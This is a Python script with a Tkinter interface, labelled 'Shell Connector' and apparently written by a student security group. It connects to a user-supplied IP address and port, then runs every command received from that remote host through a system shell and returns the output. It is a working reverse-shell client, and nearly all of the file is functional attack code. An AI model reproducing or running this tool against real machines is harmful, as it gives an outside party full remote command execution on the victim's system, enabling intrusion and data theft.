import os,sys,subprocess,socket
from tkinter import *

global s




root = Tk()
root.title("Shell Connector  -----> By: ISU - InfoSecUpiicsa Ci5C0")
root.iconbitmap("isu.ico")

com = StringVar()
host = StringVar()
port = IntVar()

def onEnter(event):
    startConnection()


def startConnection():
    global s
    s = socket.socket()
    host = mDir.get()
    port = int(mPort.get())
    s.connect((host, port))
    #mCommands.insert(INSERT,"SESION ESTABLECIDA CON EL SERVIDOR")
    while True:
        data = s.recv(1024)
        if data[:2].decode("ISO-8859-1") == 'cd':
            os.chdir(data[3:].decode('ISO-8859-1'))
        if len(data) > 0:
            cmd = subprocess.Popen(data[:].decode("ISO-8859-1"), shell=True, stdout=subprocess.PIPE,
                                   stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output_bytes = cmd.stdout.read() + cmd.stderr.read()
            output_str = str(output_bytes, "ISO-8859-1")
            s.send(str.encode(output_str + str(os.getcwd()) + '> '))
    s.close()


mFrame=Frame(root,width="500",height="600",bg="ivory2")
mFrame.config(relief="raised",bd="12")
mFrame.pack(fill="both",expand="true")

Label(mFrame, text="Bienvenido a Shell Connector [Client]",fg="DodgerBlue4",font=("Arial Rounded MT Bold",15)).grid(row=1,column=1,columnspan=3,pady=5)


Label(mFrame, text="Direccion IP:",fg="red",font=("Arial Rounded MT Bold",10)).grid(row=2,column=0,sticky="e",pady=5)
mDir = Entry(mFrame, width=30, justify="left",font=("Arial Rounded MT Bold",8),textvariable=host)
mDir.bind('<Return>',onEnter)
mDir.grid(row=2,column=1,sticky="w",pady=5)


Label(mFrame, text="Puerto:",fg="red",font=("Arial Rounded MT Bold",10)).grid(row=3,column=0,sticky="e",pady=5)
mPort = Entry(mFrame, width=30,justify="left",font=("Arial Rounded MT Bold",8),textvariable=port)
mPort.bind('<Return>',onEnter)
mPort.grid(row=3,column=1,sticky="w",pady=5)

btConnect = Button(mFrame,text="Conectar",width=30,bg="chartreuse2",relief="groove",command=startConnection)
btConnect.grid(row=2,column=3,columnspan=2,padx=5,pady=5)


root.mainloop()



